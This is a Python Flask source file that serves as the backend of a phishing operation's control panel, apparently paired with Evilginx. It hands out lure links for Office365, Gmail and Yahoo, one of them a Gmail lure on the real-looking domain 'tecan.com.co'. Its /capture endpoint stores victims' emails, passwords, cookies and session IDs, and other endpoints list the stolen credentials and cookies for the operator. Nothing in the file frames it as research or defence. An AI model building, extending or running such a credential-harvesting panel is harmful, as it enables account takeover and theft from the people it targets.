import os
import json
import datetime
import sqlite3
from flask import Flask, jsonify, request, make_response

app = Flask(__name__)

# ----- Custom CORS Handling -----
@app.after_request
def after_request(response):
    response.headers["Access-Control-Allow-Origin"] = "https://panel-auth-134b7.web.app"
    response.headers["Access-Control-Allow-Credentials"] = "true"
    response.headers["Access-Control-Allow-Methods"] = "GET, POST, OPTIONS"
    response.headers["Access-Control-Allow-Headers"] = "Content-Type,Authorization"
    return response

# Global handler for preflight OPTIONS requests.
@app.route('/<path:path>', methods=["OPTIONS"])
@app.route('/', methods=["OPTIONS"])
def options_handler(path=""):
    response = make_response()
    response.headers["Access-Control-Allow-Origin"] = "https://panel-auth-134b7.web.app"
    response.headers["Access-Control-Allow-Credentials"] = "true"
    response.headers["Access-Control-Allow-Methods"] = "GET, POST, OPTIONS"
    response.headers["Access-Control-Allow-Headers"] = "Content-Type,Authorization"
    return response

# ----- Database Setup -----
DB_FILE = "evilginx.db"

def init_db():
    """Initialize the SQLite database and create tables if they don't exist."""
    with sqlite3.connect(DB_FILE) as conn:
        cursor = conn.cursor()
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS generated_links (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                phishlet TEXT NOT NULL,
                link TEXT NOT NULL,
                timestamp TEXT NOT NULL,
                ip TEXT NOT NULL
            )
        ''')
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS captured_sessions (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                email TEXT NOT NULL,
                password TEXT NOT NULL,
                cookies TEXT,
                session_id TEXT,
                location TEXT,
                timestamp TEXT NOT NULL,
                ip TEXT NOT NULL
            )
        ''')
        conn.commit()

init_db()

# ----- Static Link Mapping -----
static_links = {
    "0365": "https://office365.yourdomain.com/your-office365-link",   # UPDATE with your actual Office365 URL
    "gmail": "https://accounts.tecan.com.co/enjxjwPp",                 # UPDATE with your actual Gmail URL
    "yahoo": "https://yahoo.yourdomain.com/your-yahoo-link",           # UPDATE with your actual Yahoo URL
    "gmail-old": "https://gmail-old.yourdomain.com/your-gmail-old-link"   # UPDATE with your actual Gmail (Old) URL
}

# ----- API Endpoints -----
@app.route("/generate_link", methods=["GET"])
def generate_link():
    """
    Returns a static phishing link based on the provided phishlet identifier.
    Logs the event (with timestamp and client IP) in the generated_links table.
    """
    phishlet = request.args.get("phishlet")
    if not phishlet:
        return jsonify({"error": "Phishlet parameter is required"}), 400

    link = static_links.get(phishlet)
    if not link:
        return jsonify({"error": "Invalid phishlet parameter"}), 400

    timestamp = datetime.datetime.utcnow().isoformat() + "Z"
    ip = request.remote_addr

    with sqlite3.connect(DB_FILE) as conn:
        cursor = conn.cursor()
        cursor.execute(
            "INSERT INTO generated_links (phishlet, link, timestamp, ip) VALUES (?, ?, ?, ?)",
            (phishlet, link, timestamp, ip)
        )
        conn.commit()

    return jsonify({"link": link}), 200

@app.route("/generated_links_history", methods=["GET"])
def get_generated_links_history():
    """Return the history of generated phishing links."""
    with sqlite3.connect(DB_FILE) as conn:
        cursor = conn.cursor()
        cursor.execute("SELECT phishlet, link, timestamp, ip FROM generated_links ORDER BY timestamp DESC")
        links = [
            {"phishlet": row[0], "link": row[1], "timestamp": row[2], "ip": row[3]}
            for row in cursor.fetchall()
        ]
    return jsonify(links), 200

@app.route("/captured_sessions", methods=["GET"])
def get_captured_sessions():
    """Return the captured victim session data."""
    with sqlite3.connect(DB_FILE) as conn:
        cursor = conn.cursor()
        cursor.execute("SELECT email, password, cookies, ip, timestamp FROM captured_sessions ORDER BY timestamp DESC")
        sessions = [
            {"email": row[0], "password": row[1], "cookies": row[2], "ip": row[3], "timestamp": row[4]}
            for row in cursor.fetchall()
        ]
    return jsonify(sessions), 200

@app.route("/capture", methods=["POST"])
def capture():
    """
    Capture victim session data when a phishing link is clicked.
    Expected JSON fields:
      - email (required)
      - password (required)
      - cookies (optional)
      - session_id (optional)
      - location (optional)
    The record will include a timestamp and client IP.
    """
    data = request.get_json()
    if not data:
        return jsonify({"error": "No data provided"}), 400

    email = data.get("email")
    password = data.get("password")
    if not email or not password:
        return jsonify({"error": "Email and password are required"}), 400

    cookies = data.get("cookies", "")
    session_id = data.get("session_id", "")
    location = data.get("location", "Unknown")
    timestamp = datetime.datetime.utcnow().isoformat() + "Z"
    ip = request.remote_addr

    with sqlite3.connect(DB_FILE) as conn:
        cursor = conn.cursor()
        cursor.execute(
            "INSERT INTO captured_sessions (email, password, cookies, session_id, location, timestamp, ip) VALUES (?, ?, ?, ?, ?, ?, ?)",
            (email, password, cookies, session_id, location, timestamp, ip)
        )
        conn.commit()

    return jsonify({"message": "Session captured successfully"}), 200

@app.route("/cookies", methods=["GET"])
def get_cookies():
    """
    Return a list of captured cookies from sessions.
    Only returns records where cookies are not empty.
    """
    with sqlite3.connect(DB_FILE) as conn:
        cursor = conn.cursor()
        cursor.execute("SELECT email, cookies, timestamp, ip FROM captured_sessions WHERE cookies != '' ORDER BY timestamp DESC")
        cookies_data = [
            {"email": row[0], "cookies": row[1], "timestamp": row[2], "ip": row[3]}
            for row in cursor.fetchall()
        ]
    return jsonify(cookies_data), 200

if __name__ == "__main__":
    # Paths to your Let's Encrypt SSL certificates
    cert_path = "/etc/letsencrypt/live/tecan.com.co/fullchain.pem"
    key_path = "/etc/letsencrypt/live/tecan.com.co/privkey.pem"
    if not os.path.exists(cert_path) or not os.path.exists(key_path):
        print("SSL certificates not found. Check your Let's Encrypt configuration.")
    else:
        # For production, debug mode is disabled.
        app.run(host="0.0.0.0", port=5000, debug=False, ssl_context=(cert_path, key_path))
